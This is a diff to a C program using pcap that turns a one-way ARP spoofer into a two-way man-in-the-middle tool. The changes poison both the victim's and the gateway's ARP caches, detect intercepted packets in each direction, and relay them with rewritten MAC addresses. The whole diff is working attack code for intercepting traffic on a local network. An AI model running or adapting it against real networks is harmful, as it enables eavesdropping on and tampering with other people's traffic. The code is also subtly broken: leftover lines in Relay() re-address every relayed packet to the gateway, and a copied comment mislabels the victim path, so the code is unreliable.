@@ -157,10 +157,20 @@ void arpPacketMake(u_char * packet, unsigned char * Ether_Daddr, unsigned char *
     packetMake(packet+index,receiver_IP,IP_ADDR_LEN);
 }
 
-void Relay(pcap_t *adhandle,const u_char * rsv_packet,addressList list, int len)
+void Relay(pcap_t *adhandle,const u_char * rsv_packet,addressList list, int len, int from)
 {
     u_char* packet=(u_char*)malloc(sizeof(u_char)*len);
     packetMake(packet,rsv_packet,len); // 패킷 그대로 복사
+    if(from ==1) //victim -> gateway relay
+    {
+        packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
+        packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
+    }
+    else if(from==2) // gateway -> victim relay
+    {
+        packetMake(packet,list.VictimMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
+        packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
+    }
     packetMake(packet,list.GatewayMAC,ETHER_ADDR_LEN); //destination MAAC 주소 Gateway로
     packetMake(packet+ETHER_ADDR_LEN,list.MyMAC,ETHER_ADDR_LEN); //sorcue MAC 주소 나의 주소로  cam때문에
     if(pcap_sendpacket(adhandle, packet,len)!=0)
@@ -241,12 +251,21 @@ int isSpoofPacket(const u_char * rsv_packet, addressList list){
     etherheader=(libnet_ethernet_hdr*)rsv_packet;
     ipheader=(libnet_ipv4_hdr*)(rsv_packet+ETHER_ADDR_LEN*2+2);
 
-    /*목적지 mac이 나의 mac 이어야함*/
+    /*victim이 나에게 보낸 패킷*/
     if(!memcmp(etherheader->ether_dhost,list.MyMAC,ETHER_ADDR_LEN)&&
-            !memcmp(&(etherheader->ether_shost),list.VictimMAC,IP_ADDR_LEN))
+            !memcmp(etherheader->ether_shost,list.VictimMAC,ETHER_ADDR_LEN)&&
+            memcmp(&(ipheader->ip_dst.S_un.S_un_b.s_b1),list.MyIP,IP_ADDR_LEN))
     {
-        printf("spoofed packet is arrived!!\n");
+        printf("victim -> gateway spoofed packet is arrived!!\n");
         return 1;
+    }
+    /*gateway가 나에게 보낸 패킷*/
+    else if(!memcmp(etherheader->ether_dhost,list.MyMAC,ETHER_ADDR_LEN)&&
+            !memcmp(etherheader->ether_shost,list.GatewayMAC,ETHER_ADDR_LEN)&&
+            memcmp(&(ipheader->ip_dst.S_un.S_un_b.s_b1),list.MyIP,IP_ADDR_LEN))
+    {
+        printf("gateway -> victim spoofed packet is arrived!!\n");
+        return 2;
     }
     else
     {
@@ -270,8 +289,9 @@ int isARPPacket(const u_char * rsv_packet, addressList list){
         return 0;// not arp
      }
 }
-void spoofPacketSend(pcap_t *adhandle,struct  addressList list){
+void spoofPacketSend(pcap_t *adhandle, struct  addressList list){
     u_char arp_packet[42];
+    /*sender spoofing*/
     arpPacketMake(arp_packet, list.VictimMAC, list.MyMAC, list.MyMAC, list.GatewayIP, list.VictimMAC, list.VictimIP, 0x0002);
     if (pcap_sendpacket(adhandle, arp_packet, 42 /* size */) != 0) //spoofing 패킷 보내기
     {
@@ -280,7 +300,18 @@ void spoofPacketSend(pcap_t *adhandle,struct  addressList list){
     }
     else
     {
-        printf("Spoofing Packet sended !\n");
+        printf("SenderSpoofing Packet sended !\n");
+    }
+    /*receiver spoofing*/
+    arpPacketMake(arp_packet, list.GatewayMAC, list.MyMAC, list.GatewayMAC, list.VictimIP, list.GatewayMAC, list.GatewayIP, 0x0002);
+    if (pcap_sendpacket(adhandle, arp_packet, 42 /* size */) != 0) //spoofing 패킷 보내기
+    {
+       fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(adhandle));
+       return ;
+    }
+    else
+    {
+        printf("Receiver Spoofing Packet sended !\n");
     }
 }
 
@@ -320,7 +351,11 @@ void spoofing_relay(pcap_t *adhandle, struct pcap_pkthdr *header, struct address
 
         if((htons(EtherHeader->ether_type)==0x0800)&&isSpoofPacket(rcv_pkt,list)==1) // ip 패킷
         {
-            Relay(adhandle,rcv_pkt,list,header->len);
+            Relay(adhandle,rcv_pkt,list,header->len,1);
+        }
+        if((htons(EtherHeader->ether_type)==0x0800)&&isSpoofPacket(rcv_pkt,list)==2) // ip 패킷
+        {
+            Relay(adhandle,rcv_pkt,list,header->len,2);
         }
     }
 }
@@ -405,12 +440,8 @@ int main()
     getMacAddrWithARP(adhandle,header,broadcast,addresslist.MyMAC, addresslist.MyMAC, addresslist.MyIP,
                       null_mac, addresslist.VictimIP,0x0001, addresslist.VictimMAC);
 
-    /*계속 돌아가면서 적절한 상황  릴레이      sender -> reciever , reciever -> sender 의 arp
-      패킷을 확인한다.*/
-
+    /*spoofing&relay*/
     spoofing_relay(adhandle,header, addresslist);
-
-
 
     return 1;
 }
